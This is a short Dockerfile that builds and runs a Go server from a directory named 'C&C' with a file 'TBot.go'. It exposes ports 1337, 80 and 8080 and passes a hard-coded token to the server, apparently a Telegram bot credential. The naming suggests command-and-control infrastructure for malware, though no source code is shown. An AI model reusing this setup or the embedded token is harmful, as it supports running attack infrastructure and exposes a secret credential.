FROM golang:1.17-alpine
WORKDIR ./server
COPY "./C&C/C&C.go" ./
COPY "./C&C/TBot.go" ./
COPY "./C&C/go.mod" ./
COPY "./C&C/go.sum" ./
RUN go mod download
RUN go build -o server
EXPOSE 1337
EXPOSE 80
EXPOSE 8080
CMD ./server -token 5525945094:AAGNTtFNrLRHZ20yOh9-7FdLbvdJLg5Cq8w
